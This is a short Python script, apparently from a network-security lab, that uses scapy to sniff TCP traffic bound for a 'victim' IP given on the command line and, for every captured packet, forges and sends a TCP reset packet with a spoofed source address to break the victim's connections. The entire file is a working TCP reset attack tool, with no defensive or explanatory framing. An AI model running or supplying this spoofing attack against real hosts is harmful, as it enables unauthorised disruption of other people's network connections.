#!/usr/bin/python3

#running command: python Sniffer.py victimIP

import sys  #for command line argument
import time
import os
import shutil
import tempfile
from random import randint
from scapy.all import *
from scapy.layers.inet import *
import scapy

victim_ip = sys.argv[1]

def sendRST(pkt):
    print(pkt.summary())

    print("IP source = " + str(pkt[IP].src))
    print("Port source = " + str(pkt[TCP].sport))

    print("IP dest = " + str(pkt[IP].dst))
    print("Port dest = " + str(pkt[TCP].dport))

    print("IP len = " + str(pkt[IP].len))
    print("SEQ = " + str(pkt[TCP].seq))
    print("ACK = " + str(pkt[TCP].ack))
    print("Window = " + str(pkt[TCP].window))

    print()

    IPLayer = IP(dst=victim_ip, src=pkt[IP].src)
    TCPLayer = TCP(flags="R", seq=pkt[TCP].seq, dport=pkt[TCP].dport, sport=pkt[TCP].sport, window=pkt[TCP].window, ack=pkt[TCP].ack)
    spoofpkt = IPLayer/TCPLayer
    

    print("Spoofed IP source = " + str(spoofpkt[IP].src))
    print("Spoofed Port source = " + str(spoofpkt[TCP].sport))

    print("Spoofed IP dest = " + str(spoofpkt[IP].dst))
    print("Spoofed Port dest = " + str(spoofpkt[TCP].dport))

    print("Spoofed IP len = " + str(spoofpkt[IP].len))
    print("Spoofed SEQ = " + str(spoofpkt[TCP].seq))
    print("Spoofed ACK = " + str(spoofpkt[TCP].ack))
    print("Spoofed Window = " + str(spoofpkt[TCP].window))

    send(spoofpkt, verbose=0)

    print()    
    print()

pkt = sniff(filter="tcp and dst host " + victim_ip, prn=sendRST, store=0)

